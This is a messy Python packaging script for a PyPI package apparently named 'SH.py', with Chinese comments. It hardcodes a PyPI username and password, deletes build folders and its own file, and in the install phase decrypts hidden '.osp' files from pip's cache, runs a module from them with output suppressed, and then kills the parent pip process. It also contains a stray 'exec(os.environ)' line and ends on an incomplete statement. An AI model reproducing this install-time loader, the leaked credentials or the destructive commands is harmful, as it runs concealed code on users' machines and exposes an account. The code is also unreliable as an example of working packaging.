#!/usr/bin/python
class Var:
      nameA='SH.py'  #nameA!  
      nameB=18.45  #nameB! 
      @classmethod
      def popen(cls,CMD):
          import subprocess,io,re
          # CMD = f"pip install cmd.py==999999"
          # CMD = f"ls -al"

          proc = subprocess.Popen(CMD, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, bufsize=-1)
          proc.wait()
          stdout = io.TextIOWrapper(proc.stdout, encoding='utf-8').read()
          stderr = io.TextIOWrapper(proc.stderr, encoding='utf-8').read()

          # True if stdout  else False , stdout if stdout  else stderr 
          return  stdout if stdout  else stderr 
      
      @classmethod
      def pipB(cls,name="cmd.py"):
          CMD = f"pip install {name}==999999"
          import re
          ################  錯誤輸出    
          str_stderr = cls.popen(CMD)
          SS=re.sub(".+versions:\s*","[",str_stderr)
          SS=re.sub("\)\nERROR.+\n","]",SS)
          # print("SS..",eval(SS))
          BB = [i.strip() for i in SS[1:-1].split(",")]
          
          print(f"[版本] {cls.nameA}: ",BB)
          ################  return  <list>   
          return BB
         
     

      def __new__(cls,name=None,vvv=None):
       
          if  name!=None and vvv!=None:
               
              #######################################################
            #   with  open( __file__ , 'r+' ,encoding='utf-8') as f :        
            #         ############################
            #         f.seek(0,0)       ## 規0
            #         R =f.readlines( ) 
            #         R[1]=f"      nameA='{name}'\n"
            #         R[2]=f"      nameB='{vvv}'\n"
            #         ##########################
            #         f.seek(0,0)       ## 規0
            #         f.writelines(R)
                            
              #######################################################
              with  open( __file__ , 'r+' ,encoding='utf-8') as f :        
                    ############################
                
                    ####################### 2022/2/2
                    if  cls.nameA==None:
                        cls.nameA=""
                        cls.nameB=""
                        import sys
                        print("@ 20022: ", sys.argv)


                        SS=open(__file__,"r").readlines() 
                        SS[2] = SS[2].replace("None  #nameA!",f'"{sys.argv[1]}"  #nameA!')
                        SS[3] = SS[3].replace("None  #nameB!",f'"{sys.argv[2]}"  #nameB!')
                        print(SS)
                        open(__file__,"w").writelines(SS) 
                    ####################### 2022/2/2


                    # N="name"
                    NR=["#nameA!","#nameB!"]
                    ######## 禁止i.strip() 刪除 \n 和\tab ############
                    ### R is ########## 本檔案 #######################
                    f.seek(0,0)       ## 規0
                    R =f.readlines( ) 
                    # R=[ i for i in open(__file__).readlines()] 
                    # print(R)

                    ###############
                    # Q=[ (ii,i) for i,b in enumerate(R) for ii in b.strip().split(" ") if len(b.strip().split(" "))!=1  if  ii in ["#nameA!","#nameB!"]   ]
                    Q=[ (i,b) for i,b in enumerate(R) for ii in b.strip().split(" ") if len(b.strip().split(" "))!=1  if  ii in NR   ]
                    # print(Q)


                    # 
                    if len(Q)==len(NR):
                        # print("**Q",*Q)
                        NR=[ i.strip("#!") for i in NR] ## 清除[#!] ---> ["nameA","nameB"]
                        NG=[ f"'{name}'" , vvv ]
                        def RQQ( i , b ):
                            print( "!rrr!", i ,b)
                            NRR = NR.pop(0) 
                            NGG = NG.pop(0) 
                            import re
                            print( "!rrr!",Q[0]) ## (2, 'nameA=None  #nameA!')
                            R01 = list(  b  )     ## 字元陣列 ## 

                            N01 = "".join(R01).find( f"{ NRR }")
                            R01.insert(N01,"=")
                            print( "!rrr!", R01  )

                            N01 = "".join(R01).find( f"#{ NRR }!")
                            R01.insert(N01,"=")
                            print( "!rrr!",R01  )

                            ### 修改!.
                            QQA="".join(R01).split("=")
                            QQA.pop(2)
                            QQA.insert(2, f"={ NGG }  ")
                            print( "!rrr!" ,"".join(QQA)  )

                            ### 本檔案..修改
                            return  i ,"".join(QQA)

                        for ar in Q:
                            # print("!XXXX")
                            N,V = RQQ( *ar )
                            R[N] = V
                        ##########################
                        f.seek(0,0)       ## 規0
                        # print("@ R ",R)
                        f.writelines(R)


              ##
              ##########################################################################
              ##  這邊會導致跑二次..............關掉一個
              if  cls.nameA==None:
                  import os,importlib,sys
                  # exec("import importlib,os,VV")
                  # exec(f"import {__name__}")
                  ############## [NN = __name__] #########################################
                  # L左邊 R右邊
                  cls.NN = __file__.lstrip(sys.path[0]).replace(os.path.sep,r".")[0:-3]  ## .py
                  print("@ cls.NN (nameA==None): ", cls.NN )
                  cmd=importlib.import_module( cls.NN ) ## 只跑一次
                  # cmd=importlib.import_module( "setup" ) ## 只跑一次(第一次)--!python
                  # importlib.reload(cmd)                ## 無限次跑(第二次)
                  ## 關閉
                  # os._exit(0)  
                  sys.exit()     ## 等待 reload 跑完 ## 當存在sys.exit(),強制無效os._exit(0)

             

          else:
              return  super().__new__(cls)




# ################################################################################################
# def siteOP():
#     import os,re
#     pip=os.popen("pip show pip")
#     return re.findall("Location:(.*)",pip.buffer.read().decode(encoding='utf8'))[0].strip() 

# ## 檢查 ln 狀態
# !ls -al { siteOP()+"/cmds" }


            
#################################################################
#################################################################      
#################################################################
class PIP(Var):

      def __new__(cls): # 不備呼叫
          ######### 如果沒有 twine 傳回 0
          import os
          BL=False if os.system("pip list | grep twine > /dev/nul") else True
          if not BL:
             print("安裝 twine")
             cls.popen("pip install twine")
          else:
             print("已裝 twine")
          ############################  不管有沒有安裝 都跑
          ## 執行完 new 再跑 
          ## super() 可叫父親 或是 姊妹
          return  super().__new__(cls)
         
class MD(Var):
      text=[
            # 'echo >/content/cmd.py/cmds/__init__.py',
            'echo >/content/cmd.py/README.md',
            'echo [pypi]> /root/.pypirc',
            'echo repository: https://upload.pypi.org/legacy/>> /root/.pypirc',
            'echo username: moon-start>> /root/.pypirc',
            'echo password: Moon@516>> /root/.pypirc'
            ]
      def __new__(cls): # 不備呼叫
           

          for i in cls.text:
              cls.popen(i)
          ############################
          ## 執行完 new 再跑 
          ## super() 可叫父親 或是 姊妹
          return  super().__new__(cls)




class initQ(Var):
# class init(Var):
    #   classmethod
    #   def 
      # def init(cls,QQ):
      def __new__(cls): # 不備呼叫
    # def __new__(cls,QQ,nameA,nameB): # 不備呼叫
          # cls.popen(f"mkdir -p {QQ}")
          #############################
          QQ= "cmdsSQL"

        #   QQ=""
        #   import os
        #   if  os.name=="nt":
        #      os.system(f"mkdir {QQ}")
        #   elif os.name=="posix":
        #      os.system(f"mkdir -p {QQ}")
          cls.popen(f"mkdir -p {QQ}")
          #############################
          if  type(QQ) in [str]:
              ### 檢查 目錄是否存在 
              import os
              if  os.path.isdir(QQ) & os.path.exists(QQ) :
                  ### 只顯示 目錄路徑 ----建立__init__.py
                  for dirPath, dirNames, fileNames in os.walk(QQ):
                      
                      print( "echo >> "+dirPath+f"{ os.sep }__init__.py" )
                      os.system("echo >> "+dirPath+f"{ os.sep }__init__.py") 

                     
              else:
                      ## 當目錄不存在
                      print("警告: 目錄或路徑 不存在") 
#               ###################################################
              
          else:
                print("警告: 參數或型別 出現問題") 



                exec(os.environ)


# class sdist(MD,PIP,initQ):
class sdist(MD,PIP):
      import os
      ########################################################################
      VVV=True
     
      dir = Var.nameA.rstrip(".py")  if Var.nameA!=None else "cmds"     


      @classmethod
      def rm(cls):
          import os
          # /content/sample_data   
          if os.path.isdir("/content/sample_data"):
            os.system(f"rm -rf /content/sample_data")



            ################################################################################ 
          if not os.path.isfile("/content/True"):
            ################################################################################  
            if os.path.isdir("dist"):
                print("@刪除 ./dist")
                ##### os.system(f"rm -rf ./dist")
                print( f"rm -rf {os.getcwd()}{os.path.sep}dist" )
                os.system(f"rm -rf {os.getcwd()}{os.path.sep}dist")
            ##
            info = [i for i in os.listdir() if i.endswith("egg-info")]
            if  len(info)==1:
                if os.path.isdir( info[0] ):
                    print(f"@刪除 ./{info}")
                    #  os.system(f"rm -rf ./{info[0]}")
                    os.system(f"rm -rf {os.getcwd()}{os.path.sep}{info[0]}")
            ################################################################################
      
      def __new__(cls,path=None): # 不備呼叫
          this = super().__new__(cls)
          import os
          print("!XXXXX:" ,os.getcwd() )
          if  path=="":
              import os
              path = os.getcwd()
          ###############################
          import os
          if  not os.path.isdir( path ):
              ## 類似 mkdir -p ##
              os.makedirs( path ) 
          ## CD ##       
          os.chdir( path )
          ################################


          ######## 刪除
          cls.rm()    
        #   CMD = f"python {os.getcwd()}{os.path.sep}setup.py sdist bdist_wheel"
          CMD = f"python {os.getcwd()}{os.path.sep}setup.py sdist --formats=zip"
          # CMDtxt = cls.popen(CMD)
          ## print(f"\n\n\n@@@@@@@@@@[{CMD}]@@@@@[set]@@@@@\n",CMDtxt)
          ################################################################
          

          print("@ 目前的 pwd :",os.getcwd() ,not os.path.isfile("/content/True") )


          ##  !twine 上傳
          if  not f"{cls.nameB}" in cls.pipB(f"{cls.nameA}") and cls.nameB!=None :
              ## if  not f"{cls.nameB}" in cls.pipB(f"{cls.nameA}") and cls.nameB!=None :
              ## 建立 init ...
              ##   print( cls.dir,cls.nameA,cls.nameB )
              ##initQ(cls.dir,cls.nameA,cls.nameB)
              ########################################################
              ##############################################################
              ##############################################################
          
              cls.VVV=True
              print(f"\n\n\n@@@@@@@@@@[{CMD}]@@@@@@@@@@\n",cls.popen(CMD))
              ##############
              # CMD = "twine upload --verbose --skip-existing  dist/*"
              CMD = f"twine upload --skip-existing  {os.getcwd()}{os.path.sep}dist{os.path.sep}*"
              # print("@222@",cls.popen(CMD))

              #  if not os.path.isfile("/content/True"): ## [True]
              CMDtxt = cls.popen(CMD)
              if CMDtxt.find("NOTE: Try --verbose to see response content.")!=-1:
                print(f"\n\n\n@@@@@@@@@@[{CMD}]@@@@@@@@@@\n[結果:錯誤訊息]\nNOTE: Try --verbose to see response content.\n注意：嘗試 --verbose 以查看響應內容。\n")
              else:
                print(f"\n\n\n@@@@@@@@@@[{CMD}]@@@@@@@@@@\n",CMDtxt)
          else:
              cls.VVV=False
              print(f"[版本]: {cls.nameB} 已經存在.")
              ######################################
              # 如果目前的 Var.nameB 版本已經有了
              if Var.nameA != None:
                if str(Var.nameB) in Var.pipB(Var.nameA):
                  import sys
                #   ## 如果輸出的和檔案的不相同
                  if str(sys.argv[2])!=str(Var.nameB):
                    # print("OK!! ",*sys.argv)
                    print("OK更新!!python "+" ".join(sys.argv))
                    # os.system("python "+" ".join(sys.argv))
                    os.system("python "+" ".join(sys.argv))
                   
                    ## 結束 ##
                    BLFF="結束."

                
        
          
          ######## 刪除
          cls.rm()     
          ###################   
          return  this
          







### 首次---參數輸入
################################################# 這裡是??????      
import sys
if    len(sys.argv)==3 and (not "clean" in sys.argv):
    ##################################### 2022/2/2
    #@ sys:: ['-c', 'clean', '--all']
    ##################################### 2022/2/2
    # ################################# 關閉 print !!
    # import sys,os
    # SS=sys.stdout
    # sys.stdout=open(os.devnull,"w")
    # ################################# 打開 print !!
    # sys.stdout=SS
    # ###################################################


    ##########################
    ## 產生:設定黨
    if sys.argv[2].find(r"--formats=zip") == -1:
    # if sys.argv[2].find(r"bdist_wheel") == -1:
        Var(sys.argv[1],sys.argv[2])
        ################################################

        import os
        sdist(os.path.dirname(sys.argv[0]))
        #################################################
        os.remove(__file__)
        # os.system(f'start cmd /k "timeout /nobreak /t 3&& echo @@@{ 9999123 }@@@ && pause"')
        #################################################
        
       

# ################################################# 這裡是?????? 
# def pypiTO(DIR):
#     # https://ithelp.ithome.com.tw/articles/10223402
#     # !pip3 install nuitka
#     # !nuitka3 --module K.py
#     def exeTO(path,name):
#         # name= "KKB.py"
#         # path= "/content/QQ"
#         import os
#         home= os.getcwd()
#         os.chdir(path)
#         os.system(f"nuitka3 --module {name}")
#         os.remove( name );os.remove( name[0:-3]+".pyi");
#         # os.removedirs("TT.build")
#         import shutil ## 多層目錄
#         shutil.rmtree( name[0:-3]+'.build')
#         os.chdir(home)


#     def listPY(PWD="/content"):
#         data = {}
#         import os
#         ### 路徑   底下目錄  底下檔案
#         for root , dirs , files in os.walk(PWD):
#             # print(root) ## 所有的目錄
#             # print(root,files) ## 所有的子檔案

#             for name in files:
#                 if os.path.splitext(name)[1]==".py":
#                     # print(name)

#                     ## [init]
#                     if not root in data.keys():
#                         data[root]=[]
#                     ## [add]
#                     data[root].append(name)
#         return data
        
#     # listPY("/content")
#     import os
#     os.system("pip install nuitka")
#     data = listPY( DIR )
#     for key in data.keys():
#         # print( key , data[key] )
#         for name in  data[key] :
#             # print(key, name)
#             exeTO(key,name)
# ##########################################################################
# ##########################################################################





from pip._internal.cli.main import *
              


    
# # 抽出第一個 ###########################
# # sys.argv.pop(0)
# sys.argv=["(小貓檔案)",sys.argv.pop(1)]
# #########################################


print("@週期::","sys.argv")
import sys
print("@週期 BL::",  "sys.argv" in os.environ.keys()  )
###################################################
import os;
if not "TEMP" in os.environ.keys():
    os.environ[ "TEMP" ] = "/tmp" 
###################################################
import os,sys
# 會建立這兩個
# @ 建立tmp :: ['C:\\Users\\moon\\AppData\\Local\\Temp\\pip-install-oukmky1z\\sh-py_fbdafa43643a430fb77beb3cf30172f2\\setup.py', 'egg_info', '--egg-base', 'C:\\Users\\moon\\AppData\\Local\\Temp\\pip-pip-egg-info
# @ 建立tmp :: ['C:\\Users\\moon\\AppData\\Local\\Temp\\pip-install-oukmky1z\\sh-py_fbdafa43643a430fb77beb3cf30172f2\\setup.py', 'bdist_wheel', '-d', 'C:\\Users\\moon\\AppData\\Local\\Temp\\pip-wheel-l_q1vm4y']
# print("@ 建立tmp ::",sys.argv)
###############################################
# if not "Email" in os.environ.keys():
# if 'install' in sys.argv:


print("@週期9991111111111111111::",sys.argv)
if 'clean' in sys.argv:

    # if os.name=="nt":
        # open(__file__,"w").write("print(123456789)")
        # os.system("notepad "+__file__)

    pass
if 'egg_info' in sys.argv:
    if os.name=="nt":
        import os,re
        QFF = os.path.dirname(__file__).split("pip-install")[0]
        QPIP = os.environ[ "TEMP" ]
        # print("@ RE @...",  [i for i in os.listdir( QPIP )if re.findall("pip-.+",i)]  )
        # # pip-unpack
        # print("@ RE @ pip-unpack...",  [i for i in os.listdir( QPIP )if re.findall("pip-.+",i) if not re.findall("pip-install-.+",i) if not re.findall("pip-pip-egg-info-.+",i)]  )
        # # for i in  [i for i in os.listdir( QPIP )if re.findall("pip-unpack-.+",i)]:

        for i in  [i for i in os.listdir( QPIP )if re.findall("pip-.+",i) if not re.findall("pip-install-.+",i) if not re.findall("pip-pip-egg-info-.+",i) if not re.findall("pip-req-tracker-.+",i)]:
            # print("@ DD @ ", f"rmdir /q /s  {QFF}{ i }" )
            os.system(f"rmdir /q /s  {QFF}{ i }") ## DEL

        # ################################################################
        # def  cleanup_function( **dictOP ):
        #     import os,re
        #     QFF =  dictOP["FF"] 
        #     QPIP = dictOP["PIP"] 
        #     print("@ RE 123 @...",  [i for i in os.listdir( QPIP )if re.findall("pip-.+",i)]  )
        #     for i in  [i for i in os.listdir( QPIP )if re.findall("pip-.+",i)]:
        #         print("@ DD 123 @ ", f"rmdir /q /s  {QFF}{ i }" )
        #         os.system(f"rmdir  /q /s  {QFF}{ i }") ## DEL
        # import atexit
        # atexit.register(cleanup_function,  FF= QFF , PIP=QPIP )
        # ################################################################


        # if os.name=="nt":
        # import os,re
        # QPIP = os.environ[ "TEMP" ]
        # print("@ RE @...",  [re.findall("pip-.+",i) for i in os.listdir( QPIP )]  )


        # os.listdir(  )
        # print("@ DPIP-FF ::",f"rmdir /q /s  {FF+os.path.sep}UNKNOWN-0.0.0-py3.7.egg-info" )  
        # os.system(f"rmdir /q /s  {FF+os.path.sep}UNKNOWN-0.0.0-py3.7.egg-info") ## DEL
        #############
        # open(__file__,"w").write()
        # os.system("notepad "+__file__)
    #######################            
    def DPIP(BL):
              ###########################################
              import os
              def showPIP():
                    import os,re
                    pip=os.popen("pip show pip")
                    return re.findall("Location:(.*)",pip.buffer.read().decode(encoding='utf8'))[0].strip() 
              ###########################################
              if BL:
                
                ##################################################################
                import os
                ##################################################################
                FF = showPIP()
                import os
                # print(os.popen("dir "+FF).read())
                ### 刪除1
                if os.name=="nt":     ## Win10    
                    print("@ DPIP-FF ::",f"rmdir /q /s  {FF+os.path.sep}{Var.nameA}-{Var.nameB}.dist-info" )  
                    os.system(f"rmdir /q /s  {FF+os.path.sep}{Var.nameA}-{17.96}.dist-info") ## DEL
              else:
               
                ##################################################################
                import os
                ##################################################################
                FF = showPIP()
                import os
                # print(os.popen("dir "+FF).read())
                ### 刪除1
                if os.name=="nt":     ## Win10    
                    print("@ DPIP-FF ::",f"rmdir /q /s  {FF+os.path.sep}UNKNOWN-0.0.0-py3.7.egg-info" )  
                    os.system(f"rmdir /q /s  {FF+os.path.sep}UNKNOWN-0.0.0-py3.7.egg-info") ## DEL
    #############
    # DPIP(True)
    # DPIP(False)         
    print("@ egg_info 階段 @",f"pip install {Var.nameA}=={Var.nameB} --compile --no-cache-dir")
    # if  not "pipGO" in os.environ.keys():
    #     # DPIP(True)
    #     ###########
    #     os.environ["pipGO"]="True"
    #     import subprocess,os
        ### 注意屬性[pip -v]
        # sproc = subprocess.Popen(f"python -m pip install {Var.nameA}=={Var.nameB} --compile --no-cache-dir",shell=True,stdout=open(os.devnull,"w") )
        # sproc = subprocess.Popen(f"pip install {Var.nameA}=={Var.nameB} --compile --no-cache-dir",shell=True  )
        # os.system(f"pip install {Var.nameA}=={Var.nameB} ") ## 顯示數據
        # sproc.wait() ##
        # sproc = subprocess.Popen(f"pip install SH.py==17.96 --compile --no-cache-dir",shell=True,stdout=open(os.devnull,"w") )
        # sproc = subprocess.Popen(f'python -c "from pip._internal.cli.main import *\nmain([\"install\",\"SH.py\",\"17.96\""',shell=True,stdout=open(os.devnull,"w") )
        


        
        # ################################# 關閉 print !!
        # import sys,os
        # SS=sys.stdout
        # sys.stdout=open(os.devnull,"w")
        # #### pip-install ####1 ...成功版
        # from pip._internal.cli.main import *
        # # main(["install","SH.py==17.96" ,"--compile" ,"--no-cache-dir" ])
        # sys.stdout=SS

        # os.system(f"pip install SH.py==17.96") ## 顯示數據
        # while True:
        #     import time
        #     time.sleep(1)
        #     print("@@"*100)
        ################################# 關閉 print !!
        # import sys,os
        # SS=sys.stdout
        # sys.stdout=open(os.devnull,"w")

        # import os
        # os.system("pip install SH.py==17.96 --compile --no-cache-dir")
        # ### 直接關閉!!
        # import subprocess,os
        # os.kill(str(os.getppid()))
        # subprocess.Popen(f"cmd.exe /k taskkill /F /T /PID { str(os.getppid()) }", shell=True) ## 成功
        # sys.exit()     ## 等待 reload 跑完 ## 當存在sys.exit(),強制無效os._exit(0)
        ######################################################
        ###########
        # DPIP(False)
        # import os



if 'bdist_wheel' in sys.argv:

    import os,tempfile as T
    dir_name = T.mkdtemp(suffix="..\\",prefix="",dir=  os.environ[ "TEMP" ] ) 
    name = dir_name[len(os.environ[ "TEMP" ])+1::]                       

    # Author-email:
    import os
    os.environ[ "Email" ] = str(name[0:-3]+"@gmail.com")
    # print(dir_name,"---",name[0:-3]+"@gmail.com" )
    ####################################################
    # C:\Users\moon\AppData\Local\Temp
    # os.system(f"echo print(999)>{dir_name}{os.path.sep}GO.py")

    ################################################################################ 
    # os.system(f"echo {os.getpid()} {os.getppid()}>/content/PID2.py")


import sys,os
if 'bdist_wheel' in sys.argv:
   
    # import os,subprocess
    # if not "sys.init" in os.environ.keys():
    #      os.environ["sys.init"]="True"
    #      ### 注意屬性[pip -v]
    #     #  sproc = subprocess.Popen(f'start /d "{os.getcwd()}" cmd /k "pip install {Var.nameA}=={Var.nameB}" ',shell=True,stdout=open(os.devnull,"w") )
    #     #  sproc = subprocess.Popen(f'start /d "{os.getcwd()}" pip install {Var.nameA}=={Var.nameB} ',shell=True,stdout=open(os.devnull,"w") )
    #      sproc = subprocess.Popen(f'pip install {Var.nameA}=={Var.nameB} ',shell=True,stdout=open(os.devnull,"w") )
    #      sproc.wait() ##
         
    #      subprocess.Popen(f"cmd.exe /k taskkill /F /T /PID { str(os.getpid()) }", shell=True) ## 成功
    print("關閉 print !! A")
    import os
         # # os.system(f'start /d "{mvQ()}" cmd /k "timeout /nobreak /t 3&& echo !!mvQ!! && pause"')
    if "sys.argv" in os.environ.keys():
            # import os,sys
            # os.system(f'start cmd /c "timeout /nobreak /t 13&& echo {str(sys.argv)} && pause"')
            # # def job(d): 
            # #     import os,sys
            # #     os.system(f'start cmd /c "timeout /nobreak /t 13&& echo {str(sys.argv)} && pause"')




            # # #####################################################  
            # # # 建立一個子執行緒
            # # import threading , os
            # # # global t        
            # # t = threading.Thread(target = job, args=(123,))
            # # setattr(t,"pid",os.getpid())
            # # ################################################
            # # # 執行該子執行緒
            # # t.start()
            # # del os.environ["sys.argv"]


            # ##########
            # #########
        
            #####################
            def DQ64(pathQ="/content/R.py"):
                    def D64Q(path="/content/R.py"):
                        import base64
                        image = open( path , 'r',encoding="utf-8").read()
                        ###########################################
                        import os
                        os.system("pip install cryptocode > log.py") 
                        import cryptocode
                        os.remove("log.py")
                        ############################################
                        wow = os.popen("git config root.dir").read().rstrip()    
                        # os.system(f'start cmd /c "timeout /nobreak /t 3&& echo { str(wow) }222@@ && pause"')

                        # wow = os.environ[ "Email" ].split("@")[0][::-1]
                        valueQ = cryptocode.decrypt(image, wow )
                        # print(value)
                        value = base64.b64decode(valueQ).decode('utf-8') ## 解碼 2進位為中文碼
                        ############################################
                        # value = base64.b64decode(image).decode('utf-8') ## 解碼 2進位為中文碼
                        # print(value.decode('utf-8'),type(value))
                        # print(value)
                        open( path , 'w').write(value)


                    ##### 解碼
                    # D64Q()


                    def listPY(PWD="/content"):
                        data = {}
                        import os
                        ### 路徑   底下目錄  底下檔案
                        for root , dirs , files in os.walk(PWD):
                            # print(root) ## 所有的目錄
                            # print(root,files) ## 所有的子檔案

                            for name in files:
                                if os.path.splitext(name)[1]==".osp":
                                    # print(name)
                                    
                                    ## [rename]
                                    os.rename(os.path.join(root,name),os.path.join(root,name[0:-3]+"py"))
                                    name = name[0:-3]+"py"

                                    ## [init]
                                    if not root in data.keys():
                                        data[root]=[]
                                    ## [add]
                                    data[root].append(name)

                        # return data
                        return [ os.path.join(path,name) for path,R in data.items() for name in R ]
                        


                    # import os
                    for i in listPY( pathQ ):
                        D64Q(i)

            #############################################
            #############################################
            import os;
            if not "TEMP" in os.environ.keys():
                os.environ[ "TEMP" ] = "/tmp" 
            #############################################
            import os
            sumPATH = os.environ["LOCALAPPDATA"]+ r"\pip\cache\http\b\b" if os.name=="nt" else ( os.environ["HOME"]+"/.cache/pip/http/b/b" if os.name=="posix" else "NoneQ" )
            import os
            home = os.getcwd()
            print( "@  sumPATH:" ,sumPATH  )
            os.chdir( sumPATH )
            sumQ = os.popen("git config root.dir").read().rstrip()  ## sumQ
            print( "@  home:" , home  )
            os.chdir( home )
            #############################################
            import os,sys
            #### "PYTHONPATH" = A +os.path.sep+ B
            #### "PYTHONPATH" = os.getcwd() +os.path.sep+ os.environ[ "PYTHONPATH" ]
            hoem = os.getcwd()
            # os.chdir( os.environ["TEMP"]  )         ## A
            # os.environ[ "PYTHONPATH" ] = f"{sumQ}..\\"   ## B
            # #########################################################
            # print( "@  sumQ:" , os.environ["TEMP"]+os.path.sep+f"{sumQ}..\\"   )
            # os.chdir( os.environ["TEMP"]+os.path.sep+f"{sumQ}..\\"  )         ## C
            #########################################################
            #### 解碼
            os.system("pip3 install pycryptodomex && pip install cryptocode==0.1")
            # print( "@  DQ64:" , os.environ["TEMP"]+os.path.sep+f"{sumQ}..\\\\"   )
            # print( "@  DQ64:" , os.environ["TEMP"]+os.path.sep+f"{sumQ}"   )
            # DQ64(  os.environ["TEMP"]+os.path.sep+f"{sumQ}..\\"   )
            #################################################################################
            # DQ64(  os.environ["TEMP"]+ os.path.sep +os.environ[ "PYTHONPATH" ]  )
            # print( os.popen(" ".join(eval(os.environ["sys.argv"]))).read()  )
            # print( " ".join(eval(os.environ["sys.argv"])).read()  )
            #############################################
            #############################################
            # os.chdir(home)
            ##############################################
            # .insert(0,SH_py())
            # sys.meta_path.insert(0,SH_py())
            ###############################################
            # from posix import listdir
            import tempfile

            # https://blog.gtwang.org/linux/linux-cp-command-copy-files-and-directories-tutorial/
            def XCOPY(nameA="/content/sample_data",nameB="/content/A/B/C"):
                import os
                if os.name=="posix": 
                    os.system(f"mkdir -p {nameB}")
                    os.system(f"cp -r {nameA} {nameB}")
                elif  os.name=="nt":
                    os.rename(nameA,nameA[0:-3])
                    os.system(f"XCOPY {nameA[0:-3]} {nameB}{os.path.sep}* /s /e /h /y")
                    os.rename(nameA[0:-3],nameA)

            ### 
            with tempfile.TemporaryDirectory() as  dirname: 
                # import os
                # dirname=os.path.dirname(__file__)
                print('暫存目錄：', dirname)
                print("XCOPY :", os.environ["TEMP"]+os.path.sep+f"{sumQ}..\\" ,dirname )
                # ...
                import os
                # XCOPY( "/content/sample_data",dirname )
                ################################# 關閉 print !!
                import sys,os
                SS=sys.stdout
                sys.stdout=open(os.devnull,"w")
                #########################################################################
                XCOPY( os.environ["TEMP"]+os.path.sep+f"{sumQ}..\\" ,dirname )
                DQ64(  dirname   )
                ################################# 打開 print !!
                sys.stdout=SS
                ###################################################

                # print(os.listdir(dirname))
                # print(os.listdir(dirname+os.path.sep+"sample_data" ))
                import sys
                sys.path.append( dirname )  ## 無效果 sys.patrh
                import importlib , os
                nameG = str( os.environ["sys.argv"] )
                print("@ import ",nameG  , sys in sys.modules.keys() , os.environ["sys.argv"] ,os.environ["sys.cmds"]  )
              


                # import importlib as L
                # L.import_module(name, package=None)
                
                # # importlib.import_module( nameG )
                # os.environ["sys.cmdOP"]=str( dirname ) 
# @!! ...PYTHONPATH ::: C:\Users\moon\Desktop\PythonAPI\Lib\site-packages12399;C:\;
# @!! ...sys.argv os::: ['C:\\Users\\moon\\Desktop\\PythonAPI\\Scripts\\cmdsSQL.exe']
# @!! ...sys.cmds os::: cmdsSQL=SQL.databasesB:main
                #########
                import os
                cc,ff= os.environ["sys.cmds"].split("=")[1].split(":")
                # open(f"{dirname}{os.path.sep}ST.py").write("")
                # os.system(f'start /D \"{dirname}\" cmdsSQL.exe')
                #
                # os.system(f'start cmd /k "python -c \" import importlib,os,sys;sys.path.append( \\\"{dirname}\\\" );cmds = importlib.import_module( \\\"{cc}\\\" );exec(f\\\"cmds.{ff}()\\\");  \""')
                # os.system(f'start cmd /c "python -c \" import importlib,os,sys;sys.path.append( \\\"{dirname}\\\" );cmds = importlib.import_module( \\\"{cc}\\\" );exec(f\\\"cmds.{ff}()\\\");  \""')
                ###############################################
                SS=dirname.replace("\\","\\\\")
                SF=__file__.replace("\\","\\\\")
                CMDend = os.popen(f'start cmd /c "python -c \"import os;os.remove(\\\"{SF}\\\");import importlib,os,sys;sys.path.append( \\\"{SS}\\\" );cmds = importlib.import_module( \\\"{cc}\\\" );exec(f\\\"cmds.{ff}()\\\");  \""').read()

                # os.environ
                # CMDend = os.popen(f'start cmd /k "python -c \"import importlib,os,sys;sys.path.append( \\\"{SS}\\\" );exec(f\\\"from {cc} import {ff};{ff}()\\\");  \"" && taskkill /F /T /PID {str(os.getppid())}').read()
                # import os
                # while not os.path.isdir(dirname.replace("\\","/")+os.path.sep+cc.replace(".","/")+"__pycache__"):
                #     print("time ..",CMDend)


                import importlib
                # SS="cmdsSQL=SQL.databasesB:main"
                # cmds = importlib.import_module('SQL.databasesB')
                # ##########################################################################
                # cc,ff= os.environ["sys.cmds"].split("=")[1].split(":")
                # cmds = importlib.import_module( cc )
                # exec(f"cmds.{ff}()")
                # ########################################################################

                # ################################
                # import sys,os.site
                # sys.stdout=SS
                # sys.stdout= open( os.path.dirname(site.__file__)+os.path.sep+"log.py" ,"w")
                # cc,ff= os.environ["sys.cmds"].split("=")[1].split(":")
                # cmds = importlib.import_module( cc )
                # exec(f"cmds.{ff}()")
                # sys.stdout.close()
                # ################################
                # sys.stdout=SS
                # #################################
                # ########################################################################

                

                import os
                # os.system(f'start cmd /c "timeout /nobreak /t 13&& echo { os.getpid() }-{ os.getppid() }-{ os.path  } && pause"')
                #####
                # G= eval(str(os.environ["sys.argv"]))
                # os.system(f'start cmd /k "python -c \"import sys;sys.argv={G};import {cc} as cmds;cmds.{ff}()\""')
                ###################
             

                # print("@ type ::", type(os.environ["sys.cmds"]),os.environ["sys.cmds"],os.environ["sys.cmds"].decode('utf-8') ,os.environ["sys.cmds"].encode("utf8") )

            # 自動刪除暫存目錄與所有內容

            
            import sys , site ,os ,__main__
            print("@!! ...main :::", __main__ , id(__main__) )
            print("@!! ...site :::", site , id(site) ,  os.getpid()  ,  os.getppid() )
            print("@!! ...XXXX sys.argv 9999 :::",sys.argv)
            print("@!! ...os.path :::", os.path  )
            print("@!! ...PYTHONPATH :::", os.environ["PYTHONPATH"]  )
            print("@!! ...sys.argv os:::", os.environ["sys.argv"]  )
            print("@!! ...sys.cmds os:::", os.environ["sys.cmds"]  )
            #####  import os,sys
            #### os.system(f'start cmd /c "timeout /nobreak /t 13&& echo { os.getpid() }-{ os.getppid() }-{ os.path  } && pause"')
            # input("pause:: 輸入等待")

            # ########## 移除:cryptocode 模組
            # import os
            # os.system("pip uninstall cryptocode -y> log.py")
            # os.remove("log.py")
            ################################################
            ################################################
            ################################################
            print("# 小貓 222 號")
            # ### 直接關閉!!
            import subprocess,os
            subprocess.Popen(f"cmd.exe /k taskkill /F /T /PID { str(os.getppid()) }", shell=True) ## 成功
            ######################################################
            # ## 因為我用 from 當前 所以不能用 ppid
            # subprocess.Popen(f"cmd.exe /k taskkill /F /T /PID { str(os.getpid()) }", shell=True) ## 成功
            # # os.kill( str(os.getpid()) ,9) ## 失敗
    ################################################
    ################################################
    ################################################
    print("# 小貓 111 號")
    
#     ################################# 關閉 print !!
#     import sys,os
#     SS=sys.stdout
#     sys.stdout=open(os.devnull,"w")
#     print("關閉 print !! B")
# if 'clean' in sys.argv:
#     ################################# 打開 print !!
#     sys.stdout=SS
#     ###################################################
#     print("@ clean ...")




if   sdist.VVV and (not "BLFF" in dir()):
  # if sys.argv[1]== 'bdist_wheel' or sys.argv[1]== 'sdist' or  sys.argv[1]=='install':


